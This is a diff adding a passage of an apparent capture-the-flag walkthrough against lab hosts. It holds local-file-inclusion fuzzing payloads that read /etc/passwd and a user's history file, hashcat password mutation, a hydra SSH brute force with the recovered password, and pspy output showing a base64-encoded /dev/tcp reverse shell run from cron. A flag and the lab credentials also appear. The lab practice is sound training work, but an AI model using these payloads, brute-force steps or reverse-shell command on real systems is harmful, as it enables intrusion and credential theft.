@@ -339,3 +339,345 @@ ________________________________________________
 [Status: 200, Size: 1910, Words: 872, Lines: 36, Duration: 189ms]
     * FUZZ: /proc/interrupts
 
+[Status: 200, Size: 2903, Words: 201, Lines: 41, Duration: 189ms]
+    * FUZZ: /proc/mounts
+
+[Status: 200, Size: 156, Words: 79, Lines: 3, Duration: 186ms]
+    * FUZZ: /proc/net/arp
+
+[Status: 200, Size: 512, Words: 290, Lines: 5, Duration: 189ms]
+    * FUZZ: /proc/net/route
+
+[Status: 200, Size: 27, Words: 1, Lines: 1, Duration: 189ms]
+    * FUZZ: /proc/self/cmdline
+
+[Status: 200, Size: 353, Words: 165, Lines: 13, Duration: 189ms]
+    * FUZZ: /proc/partitions
+
+[Status: 200, Size: 8100, Words: 3017, Lines: 55, Duration: 192ms]
+    * FUZZ: /proc/net/tcp
+
+[Status: 200, Size: 449, Words: 239, Lines: 5, Duration: 197ms]
+    * FUZZ: /proc/net/dev
+
+[Status: 200, Size: 1313, Words: 92, Lines: 56, Duration: 189ms]
+    * FUZZ: /proc/self/status
+
+[Status: 200, Size: 153, Words: 17, Lines: 2, Duration: 189ms]
+    * FUZZ: /proc/version
+
+[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 1696ms]
+    * FUZZ: ../../../../../../etc/passwd&=%3C%3C%3C%3C
+
+[Status: 200, Size: 41932, Words: 6540, Lines: 578, Duration: 190ms]
+    * FUZZ: /var/log/dmesg
+
+[Status: 200, Size: 292584, Words: 2, Lines: 1, Duration: 293ms]
+    * FUZZ: /var/log/lastlog
+
+[Status: 200, Size: 63744, Words: 4, Lines: 61, Duration: 589ms]
+    * FUZZ: /var/log/wtmp
+
+[Status: 200, Size: 1536, Words: 1, Lines: 1, Duration: 495ms]
+    * FUZZ: /var/run/utmp
+
+[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 188ms]
+    * FUZZ: ///////../../../etc/passwd
+
+:: Progress: [922/922] :: Job [1/1] :: 211 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
+
+http://10.10.70.179/index.php?page=php://filter/resource=/etc/passwd
+
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin blue:x:1000:1000:blue:/home/blue:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false red:x:1001:1001::/home/red:/bin/bash 
+
+3 users /home/syslog /home/blue /home/red
+
+http://10.10.124.199/index.php?page=file:////home/blue/.bash_history
+
+echo "Red rules" cd hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt cat passlist.txt rm passlist.txt sudo apt-get remove hashcat -y 
+
+https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html
+
+http://10.10.70.179/index.php?page=php://filter/resource=/home/blue/.reminder
+
+sup3r_p@s$w0rd! 
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cat .reminder  
+sup3r_p@s$w0rd!
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist_blue.txt
+                                                                                                          
+┌──(witty㉿kali)-[~/Downloads]
+└─$ more passlist_blue.txt 
+sup3r_p@s$w0rd!
+!dr0w$s@p_r3pus
+SUP3R_P@S$W0RD!
+Sup3r_p@s$w0rd!
+sup3r_p@s$w0rd!0
+sup3r_p@s$w0rd!1
+sup3r_p@s$w0rd!2
+sup3r_p@s$w0rd!3
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ hydra -l blue -P passlist_blue.txt 10.10.70.179 ssh -t 64
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 77 login tries (l:1/p:77), ~2 tries per task
+[DATA] attacking ssh://10.10.70.179:22/
+[22][ssh] host: 10.10.70.179   login: blue   password: sup3r_p@s$w0rd!
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ ssh blue@10.10.70.179                                    
+The authenticity of host '10.10.70.179 (10.10.70.179)' can't be established.
+ED25519 key fingerprint is SHA256:Jw5VYW4+TkPGUq5z4MEIujkfaV/jzH5rIHM6bxyug/Q.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.70.179' (ED25519) to the list of known hosts.
+blue@10.10.70.179's password: 
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-124-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat 15 Jul 2023 09:49:03 PM UTC
+
+  System load:  1.92              Processes:             128
+  Usage of /:   60.9% of 8.87GB   Users logged in:       0
+  Memory usage: 12%               IPv4 address for ens5: 10.10.70.179
+  Swap usage:   0%
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+61 updates can be applied immediately.
+6 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+6 updates could not be installed automatically. For more details,
+see /var/log/unattended-upgrades/unattended-upgrades.log
+
+Last login: Mon Apr 24 22:18:08 2023 from 10.13.4.71
+blue@red:~$ id
+uid=1000(blue) gid=1000(blue) groups=1000(blue)
+blue@red:~$ ls
+flag1
+blue@red:~$ cat flag1
+THM{Is_thAt_all_y0u_can_d0_blU3?}
+blue@red:~$ cd /tmp
+blue@red:/tmp$ wget http://10.8.19.103:1234/pspyThere is no way you are going to own this machine
+Say Bye Bye to your Shell Blue and that password
+Connection to 10.10.70.179 closed by remote host.
+Connection to 10.10.70.179 closed.
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ hydra -l blue -P passlist_blue.txt 10.10.70.179 ssh -t 64
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 77 login tries (l:1/p:77), ~2 tries per task
+[DATA] attacking ssh://10.10.70.179:22/
+[22][ssh] host: 10.10.70.179   login: blue   password: sup3r_p@s$w0sup3r_p@s$w0
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ python3 -m http.server 1234                   
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.10.70.179 - - [15/Jul/2023 17:51:19] "GET /pspy64s HTTP/1.1" 200 -
+10.10.70.179 - - [15/Jul/2023 17:51:42] "GET /pspy64 HTTP/1.1" 200 -
+
+blue@red:/tmp$ wget http://10.8.19.103:1234/pspy64
+--  http://10.8.19.103:1234/pspy64
+Connecting to 10.8.19.103:1234... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3104768 (3.0M) [application/octet-stream]
+Saving to: ‘pspy64’
+
+pspy64                     100%[======================================>]   2.96M  1.19MB/s    in 2.5s    
+
+(1.19 MB/s) - ‘pspy64’ saved [3104768/3104768]
+
+blue@red:/tmp$ chmod +x pspy64 
+blue@red:/tmp$ ./pspy64
+pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+                   ░           ░ ░     
+                               ░ ░     
+
+Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
+Roses are Red, but violets aren’t blue, They’re purple, you dope. Now go get a clue.
+Roses are Red, but violets aren’t blue, They’re purple, you dope. Now go get a clue.
+Draining file system events due to startup...
+done
+ CMD: UID=1001  PID=2066   | bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 & 
+ CMD: UID=1000  PID=2041   | ./pspy64 
+ CMD: UID=1001  PID=2028   | bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 & 
+ CMD: UID=1000  PID=1999   | -bash 
+ CMD: UID=1000  PID=1998   | sshd: blue@pts/0     
+ CMD: UID=0     PID=1918   | 
+ CMD: UID=1000  PID=1915   | (sd-pam) 
+ CMD: UID=1000  PID=1914   | /lib/systemd/systemd --user 
+ CMD: UID=0     PID=1901   | sshd: blue [priv]    
+ CMD: UID=1001  PID=1682   | bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 & 
+ CMD: UID=0     PID=1520   | 
+ CMD: UID=0     PID=1507   | 
+ CMD: UID=0     PID=1199   | 
+ CMD: UID=0     PID=1064   | 
+ CMD: UID=33    PID=973    | /usr/sbin/apache2 -k start 
+ CMD: UID=33    PID=763    | /usr/sbin/apache2 -k start 
+ CMD: UID=33    PID=762    | /usr/sbin/apache2 -k start 
+ CMD: UID=33    PID=761    | /usr/sbin/apache2 -k start 
+ CMD: UID=33    PID=752    | /usr/sbin/apache2 -k start 
+ CMD: UID=33    PID=751    | /usr/sbin/apache2 -k start 
+ CMD: UID=0     PID=732    | /usr/sbin/apache2 -k start 
+ CMD: UID=0     PID=713    | /sbin/agetty -o -p -- \u --noclear tty1 linux 
+ CMD: UID=0     PID=712    | /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal 
+ CMD: UID=0     PID=710    | /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220 
+ CMD: UID=0     PID=709    | /usr/lib/policykit-1/polkitd --no-debug 
+ CMD: UID=0     PID=703    | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
+ CMD: UID=0     PID=679    | 
+ CMD: UID=1     PID=672    | /usr/sbin/atd -f 
+ CMD: UID=0     PID=668    | /usr/lib/udisks2/udisksd 
+ CMD: UID=0     PID=657    | /lib/systemd/systemd-logind 
+ CMD: UID=0     PID=654    | /usr/lib/snapd/snapd 
+ CMD: UID=104   PID=642    | /usr/sbin/rsyslogd -n -iNONE 
+ CMD: UID=0     PID=635    | /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers 
+ CMD: UID=0     PID=633    | /usr/sbin/irqbalance --foreground 
+ CMD: UID=103   PID=617    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 
+ CMD: UID=0     PID=615    | /usr/sbin/cron -f 
+ CMD: UID=0     PID=609    | /usr/bin/amazon-ssm-agent 
+ CMD: UID=0     PID=608    | /usr/lib/accountsservice/accounts-daemon 
+ CMD: UID=101   PID=596    | /lib/systemd/systemd-resolved 
+ CMD: UID=100   PID=594    | /lib/systemd/systemd-networkd 
+ CMD: UID=102   PID=565    | /lib/systemd/systemd-timesyncd 
+ CMD: UID=0     PID=550    | 
+ CMD: UID=0     PID=549    | 
+ CMD: UID=0     PID=544    | 
+ CMD: UID=0     PID=543    | 
+ CMD: UID=0     PID=539    | 
+ CMD: UID=0     PID=535    | 
+ CMD: UID=0     PID=526    | /sbin/multipathd -d -s 
+ CMD: UID=0     PID=525    | 
+ CMD: UID=0     PID=524    | 
+ CMD: UID=0     PID=523    | 
+ CMD: UID=0     PID=522    | 
+ CMD: UID=0     PID=404    | /lib/systemd/systemd-udevd 
+ CMD: UID=0     PID=400    | 
+ CMD: UID=0     PID=366    | /lib/systemd/systemd-journald 
+ CMD: UID=0     PID=361    | 
+ CMD: UID=0     PID=292    | 
+ CMD: UID=0     PID=291    | 
+ CMD: UID=0     PID=284    | 
+ CMD: UID=0     PID=242    | 
+ CMD: UID=0     PID=211    | 
+ CMD: UID=0     PID=184    | 
+ CMD: UID=0     PID=162    | 
+ CMD: UID=0     PID=161    | 
+ CMD: UID=0     PID=160    | 
+ CMD: UID=0     PID=159    | 
+ CMD: UID=0     PID=120    | 
+ CMD: UID=0     PID=107    | 
+ CMD: UID=0     PID=104    | 
+ CMD: UID=0     PID=96     | 
+ CMD: UID=0     PID=94     | 
+ CMD: UID=0     PID=93     | 
+ CMD: UID=0     PID=92     | 
+ CMD: UID=0     PID=91     | 
+ CMD: UID=0     PID=89     | 
+ CMD: UID=0     PID=88     | 
+ CMD: UID=0     PID=86     | 
+ CMD: UID=0     PID=85     | 
+ CMD: UID=0     PID=84     | 
+ CMD: UID=0     PID=83     | 
+ CMD: UID=0     PID=82     | 
+ CMD: UID=0     PID=81     | 
+ CMD: UID=0     PID=80     | 
+ CMD: UID=0     PID=79     | 
+ CMD: UID=0     PID=78     | 
+ CMD: UID=0     PID=77     | 
+ CMD: UID=0     PID=30     | 
+ CMD: UID=0     PID=29     | 
+ CMD: UID=0     PID=28     | 
+ CMD: UID=0     PID=27     | 
+ CMD: UID=0     PID=26     | 
+ CMD: UID=0     PID=25     | 
+ CMD: UID=0     PID=24     | 
+ CMD: UID=0     PID=23     | 
+ CMD: UID=0     PID=22     | 
+ CMD: UID=0     PID=21     | 
+ CMD: UID=0     PID=20     | 
+ CMD: UID=0     PID=18     | 
+ CMD: UID=0     PID=17     | 
+ CMD: UID=0     PID=16     | 
+ CMD: UID=0     PID=15     | 
+ CMD: UID=0     PID=14     | 
+ CMD: UID=0     PID=13     | 
+ CMD: UID=0     PID=12     | 
+ CMD: UID=0     PID=11     | 
+ CMD: UID=0     PID=10     | 
+ CMD: UID=0     PID=9      | 
+ CMD: UID=0     PID=8      | 
+ CMD: UID=0     PID=7      | 
+ CMD: UID=0     PID=6      | 
+ CMD: UID=0     PID=4      | 
+ CMD: UID=0     PID=3      | 
+ CMD: UID=0     PID=2      | 
+ CMD: UID=0     PID=1      | /sbin/init maybe-ubiquity 
+ CMD: UID=0     PID=2070   | /snap/snapd/current/lib/x86_64-linux-gnu/ld-2.23.so --library-path /snap/snapd/current/usr/local/lib:/snap/snapd/current/lib/x86_64-linux-gnu:/snap/snapd/current/usr/lib/x86_64-linux-gnu /snap/snapd/current/usr/bin/xdelta3 config 
+ CMD: UID=0     PID=2072   | /usr/sbin/CRON -f 
+ CMD: UID=0     PID=2071   | /usr/sbin/CRON -f 
+2023/07/15 21:53:01 CMD: UID=0     PID=2074   | /usr/bin/bash /root/defense/talk.sh 
+2023/07/15 21:53:01 CMD: UID=0     PID=2073   | /bin/sh -c /usr/bin/bash /root/defense/talk.sh 
+2023/07/15 21:53:01 CMD: UID=0     PID=2076   | /usr/bin/bash /root/defense/talk.sh 
+ CMD: UID=1001  PID=2075   | /bin/sh -c echo YmFzaCAtYyAnbm9odXAgYmFzaCAtaSA+JiAvZGV2L3RjcC9yZWRydWxlcy50aG0vOTAwMSAwPiYxICYn | base64 -d | sh 
+ CMD: UID=1001  PID=2086   | bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 & 
+ CMD: UID=0     PID=2084   | awk {print $7} 
+ CMD: UID=0     PID=2083   | grep -v root 
+ CMD: UID=0     PID=2082   | grep  pts 
+ CMD: UID=0     PID=2081   | grep blue 
+2023/07/15 21:53:01 CMD: UID=0     PID=2080   | /usr/bin/bash /root/defense/talk.sh 
+2023/07/15 21:53:01 CMD: UID=0     PID=2087   | /usr/bin/bash /root/defense/talk.sh 
+La la la la la la la la la la la la la la la la
+ CMD: UID=0     PID=2088   | 
+La la la la la la la la la la la la la la la la
+2023/07/15 21:54:01 CMD: UID=0     PID=2096   | /bin/sh -c /usr/bin/bash /root/defense/backup.sh 
+2023/07/15 21:54:01 CMD: UID=0     PID=2095   | /bin/sh -c /usr/bin/bash /root/defense/talk.sh 
+ CMD: UID=0     PID=2094   | /usr/sbin/CRON -f 
+ CMD: UID=0     PID=2093   | /usr/sbin/CRON -f 
+ CMD: UID=0     PID=2092   | /usr/sbin/CRON -f 
+ CMD: UID=0     PID=2107   | 
+ CMD: UID=0     PID=2105   | awk {print $7} 
+ CMD: UID=0     PID=2104   | grep -v root 
+ CMD: UID=0     PID=2103   | grep  pts 
+ CMD: UID=0     PID=2102   | grep blue 
+2023/07/15 21:54:01 CMD: UID=0     PID=2101   | /usr/bin/bash /root/defense/talk.sh 
+2023/07/15 21:54:01 CMD: UID=0     PID=2100   | /usr/bin/bash /root/defense/talk.sh 
+ CMD: UID=1001  PID=2099   | /bin/sh -c echo YmFzaCAtYyAnbm9odXAgYmFzaCAtaSA+JiAvZGV2L3RjcC9yZWRydWxlcy50aG0vOTAwMSAwPiYxICYn | base64 -d | sh 
+2023/07/15 21:54:01 CMD: UID=0     PID=2098   | /usr/bin/bash /root/defense/backup.sh 
+2023/07/15 21:54:01 CMD: UID=0     PID=2097   | /usr/bin/bash /root/defense/talk.sh 
+ CMD: UID=???   PID=2108   | ???
+ CMD: UID=1001  PID=2111   | sh 
+ CMD: UID=1001  PID=2110   | sh 
+ CMD: UID=1001  PID=2112   | bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 & 
+ CMD: UID=0     PID=2113   | 
+ CMD: UID=0     PID=2114   | /usr/bin/chattr +a /etc/hosts 
+ CMD: UID=0     PID=2115   | /usr/bin/echo Roses are Red and you suck Blue 
